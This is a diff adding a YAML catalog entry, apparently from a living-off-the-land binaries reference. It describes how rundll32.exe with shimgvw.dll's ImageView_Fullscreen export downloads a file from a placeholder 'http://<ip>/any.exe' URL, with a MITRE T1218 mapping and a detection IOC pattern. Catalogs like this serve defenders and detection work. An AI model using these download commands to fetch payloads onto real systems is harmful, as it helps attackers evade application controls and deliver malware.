@@ -1,0 +1,26 @@
+---
+Name: shimgvw.dll
+Description: Shimgvw.dll downloader
+Author: 'Eral4m'
+Created: '2021-01-06'
+Commands:
+  - Command: rundll32.exe  "c:\windows\system32\shimgvw.dll",ImageView_Fullscreen http://<ip>/any.exe
+  - Command: rundll32.exe  "c:\windows\system32\shimgvw.dll",ImageView_FullscreenA http://<ip>/any.exe
+    Description: Once executed, rundll32.exe will download the file at the URL in the command.
+    Usecase: Downloader
+    Category: Download
+    Privileges: User
+    MitreID: T1218
+    MitreLink: https://attack.mitre.org/techniques/T1218/011/
+    OperatingSystem: Windows 10
+Full_Path:
+  - Path: c:\windows\system32\rundll32.exe
+  - Path: c:\windows\syswow64\rundll32.exe
+Detection: 
+  - IOC: rundll32.exe*ImageView_Fullscreen*://*
+Resources:
+  - Link: https://twitter.com/eral4m/status/1479080793003671557
+Acknowledgement:
+  - Person: Eral4m
+    Handle: '@eral4m'
+---
